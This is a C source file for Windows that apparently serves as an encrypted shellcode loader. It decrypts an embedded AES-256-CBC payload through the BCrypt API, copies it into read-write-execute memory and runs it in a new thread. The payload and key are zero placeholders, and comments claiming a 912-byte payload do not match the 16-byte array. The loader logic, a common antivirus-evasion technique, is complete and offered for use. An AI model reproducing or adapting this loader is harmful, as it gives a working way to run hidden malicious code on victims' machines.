#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


// length: 912 bytes
// ------------------------------------------------------------
// PLACEHOLDER: fill in your own AES-256-CBC encrypted shellcode here
// (format: [16-byte IV] + [ciphertext]). This repository does NOT
// distribute any real payload; the all-zero array below is only a
// compile-time placeholder. Replace it before testing.
// ------------------------------------------------------------
unsigned char shellcode1_aes_payload[] = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};





// ------------------------------------------------------------
// PLACEHOLDER KEY: fill in your own 32-byte AES-256 key here; it
// must match the key used by your encryption tool. This repository
// does NOT distribute any real key.
// ------------------------------------------------------------
static const unsigned char AES_KEY[32] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const int AES_KEY_LEN = 32;   // AES-256
static const int AES_IV_LEN = 16;   // AES block size

// ============================================================
// Print the error message
// ============================================================
void print_bcrypt_error(const char* step, NTSTATUS status) {
    printf("[!] %s failed: 0x%08lx\n", step, (unsigned long)status);
}

// ============================================================
// AES-256-CBC decryption (using the Windows BCrypt API)
// Parameters:
//   encrypted     - ciphertext data
//   encrypted_len - ciphertext length
//   key           - 32-byte AES-256 key
//   iv            - 16-byte initialization vector
//   output        - output: decrypted plaintext (caller must free)
//   output_len    - output: plaintext length
// Returns: 1 on success, 0 on failure
// ============================================================
int aes_decrypt(
    const unsigned char* encrypted,
    int encrypted_len,
    const unsigned char* key,
    const unsigned char* iv,
    unsigned char** output,
    int* output_len
) {
    BCRYPT_ALG_HANDLE  hAlg = NULL;
    BCRYPT_KEY_HANDLE  hKey = NULL;
    unsigned char* key_obj = NULL;
    unsigned char* iv_work = NULL;
    unsigned char* result = NULL;
    DWORD              key_obj_len = 0;
    DWORD              block_len = 0;
    DWORD              data_len = 0;
    DWORD              result_len = 0;
    NTSTATUS           status;
    int                ok = 0;

    *output = NULL;
    *output_len = 0;

    // 1. Open the AES algorithm provider
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) {
        print_bcrypt_error("BCryptOpenAlgorithmProvider", status);
        goto cleanup;
    }

    // 2. Set CBC mode
    status = BCryptSetProperty(
        hAlg,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
        (ULONG)sizeof(BCRYPT_CHAIN_MODE_CBC),
        0
    );
    if (!NT_SUCCESS(status)) {
        print_bcrypt_error("BCryptSetProperty(CBC)", status);
        goto cleanup;
    }

    // 3. Get the size required for the key object
    status = BCryptGetProperty(
        hAlg, BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&key_obj_len, sizeof(DWORD), &data_len, 0
    );
    if (!NT_SUCCESS(status)) {
        print_bcrypt_error("BCryptGetProperty(OBJECT_LENGTH)", status);
        goto cleanup;
    }

    // 4. Get the block size
    status = BCryptGetProperty(
        hAlg, BCRYPT_BLOCK_LENGTH,
        (PUCHAR)&block_len, sizeof(DWORD), &data_len, 0
    );
    if (!NT_SUCCESS(status)) {
        print_bcrypt_error("BCryptGetProperty(BLOCK_LENGTH)", status);
        goto cleanup;
    }

    // 5. Allocate working copies of the key object and IV
    key_obj = (unsigned char*)malloc(key_obj_len);
    iv_work = (unsigned char*)malloc(AES_IV_LEN);
    if (!key_obj || !iv_work) {
        printf("[!] Memory allocation failed\n");
        goto cleanup;
    }

    // 6. Generate the symmetric key
    status = BCryptGenerateSymmetricKey(
        hAlg, &hKey,
        key_obj, key_obj_len,
        (PUCHAR)key, AES_KEY_LEN,
        0
    );
    if (!NT_SUCCESS(status)) {
        print_bcrypt_error("BCryptGenerateSymmetricKey", status);
        goto cleanup;
    }

    // 7. Query the decrypted size
    memcpy(iv_work, iv, AES_IV_LEN);
    status = BCryptDecrypt(
        hKey,
        (PUCHAR)encrypted, encrypted_len,
        NULL,           // no padding info required
        iv_work, AES_IV_LEN,
        NULL, 0,        // query mode; no output written
        &result_len,
        BCRYPT_BLOCK_PADDING   // PKCS#7 padding
    );
    if (!NT_SUCCESS(status)) {
        print_bcrypt_error("BCryptDecrypt(size query)", status);
        goto cleanup;
    }

    // 8. Allocate the output buffer and decrypt
    result = (unsigned char*)malloc(result_len);
    if (!result) {
        printf("[!] Memory allocation failed for decrypted output\n");
        goto cleanup;
    }

    memcpy(iv_work, iv, AES_IV_LEN);  // reset the IV
    status = BCryptDecrypt(
        hKey,
        (PUCHAR)encrypted, encrypted_len,
        NULL,
        iv_work, AES_IV_LEN,
        result, result_len,
        &data_len,          // actual decrypted length (padding already removed)
        BCRYPT_BLOCK_PADDING
    );
    if (!NT_SUCCESS(status)) {
        print_bcrypt_error("BCryptDecrypt", status);
        goto cleanup;
    }

    *output = result;
    *output_len = (int)data_len;
    result = NULL;   // transfer ownership to avoid a double free in cleanup
    ok = 1;

cleanup:
    if (hKey)    BCryptDestroyKey(hKey);
    if (hAlg)    BCryptCloseAlgorithmProvider(hAlg, 0);
    free(key_obj);
    free(iv_work);
    free(result);
    return ok;
}

// ============================================================
// Print the hexadecimal content of the shellcode
// ============================================================
void print_shellcode(unsigned char* data, int len) {
    printf("Decrypted shellcode (%d bytes):\n", len);
    for (int i = 0; i < len; i++) {
        if (i % 16 == 0) {
            printf("%04x: ", i);
        }
        printf("%02x ", data[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    if (len % 16 != 0) {
        printf("\n");
    }
}

int main() {
    // ============================================================
    // Extract the IV and ciphertext from the payload
    // Payload format: [16 bytes IV] + [ciphertext]
    // ============================================================
    int payload_len = sizeof(shellcode1_aes_payload);        // 912
    int ciphertext_len = payload_len - AES_IV_LEN;              // 896
    unsigned char* iv = shellcode1_aes_payload;           // the first 16 bytes are the IV
    unsigned char* ciphertext = shellcode1_aes_payload + AES_IV_LEN; // the rest is ciphertext

    printf("[*] Payload size: %d bytes (IV: %d, Ciphertext: %d)\n",
        payload_len, AES_IV_LEN, ciphertext_len);

    // ============================================================
    // AES-256-CBC decryption
    // ============================================================
    unsigned char* decrypted = NULL;
    int decrypted_len = 0;

    if (!aes_decrypt(ciphertext, ciphertext_len, AES_KEY, iv, &decrypted, &decrypted_len)) {
        printf("[!] AES decryption failed!\n");
        return 1;
    }

    printf("[+] AES-256-CBC decryption successful\n");
    printf("[+] Decrypted shellcode: %d bytes (original was padded from 894 bytes)\n", decrypted_len);

    // Print the decrypted shellcode (optional, for verification)
    print_shellcode(decrypted, decrypted_len);

    // ============================================================
    // Allocate executable memory and execute the shellcode
    // ============================================================
    LPVOID pMemory = VirtualAlloc(NULL, decrypted_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pMemory == NULL) {
        printf("[!] VirtualAlloc failed\n");
        free(decrypted);
        return 1;
    }

    RtlMoveMemory(pMemory, decrypted, decrypted_len);

    // The decrypted plaintext is no longer needed and can be freed (optionally, zero it before freeing for safety)
    free(decrypted);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread failed\n");
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFree(pMemory, 0, MEM_RELEASE);

    printf("[+] Done.\n");
    return 0;
}
